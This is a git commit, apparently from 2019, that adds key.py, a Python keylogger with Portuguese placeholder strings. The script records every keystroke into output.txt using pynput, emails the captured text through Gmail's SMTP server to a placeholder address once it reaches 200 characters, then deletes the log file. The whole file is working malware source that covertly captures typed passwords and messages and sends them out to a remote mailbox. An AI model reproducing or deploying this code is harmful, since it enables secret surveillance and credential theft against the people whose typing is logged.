ddbaa7db0aaf5f294d378b45b920c0a77d99cecf
lgcarmo <48776615+lgcarmo@users.noreply.github.com>
2019-09-27 00:45:57 -0300

    Version 1.0.0

---
+++ key.py
@@ -0,0 +1,65 @@
+from pynput import keyboard
+import os
+import smtplib
+import subprocess
+
+
+def on_press(key):
+    global f
+    try:
+        f = open('output.txt', "a")
+        f.write(key.char)
+        ('alphanumeric key {0} pressed'.format(
+            key.char))
+    except AttributeError:
+        ('special key {0} pressed'.format(
+            key))
+
+
+def on_release(key):
+    print('{0} released'.format(key))
+    if key == keyboard.Key.space:
+        f.write(' ')
+    if key == keyboard.Key.enter:
+        f.write(os.linesep)
+
+    if key == keyboard.Key.caps_lock:
+        f.write('_CAPS_')
+
+    if key == keyboard.Key.shift_l:
+        f.write('_SHIFT_')
+    if key == keyboard.Key.shift_r:
+        f.write('_SHIFT_')
+
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+
+def send_email():
+    arq = (open('output.txt', 'r').read())
+
+    if len(arq) >= 200:
+        fromaddr = 'SEU EMAIL'
+        toaddr = 'SEU EMAIL '
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(fromaddr, 'SUA SENHA')
+        msg = open('output.txt', 'r').read()
+        server.sendmail(from_addr=fromaddr, to_addrs=toaddr, msg=msg)
+        server.quit()
+
+        subprocess.call(['rm','output.txt'])
+
+        print('[+] Enviado')
+        print('[+] Apagado')
+    else:
+        print('[-] Não ENviado')
+
+
+# Collect events until released
+with keyboard.Listener(on_press=on_press,
+                       on_release=on_release) as listener:
+    listener.join()
+
+send_email()
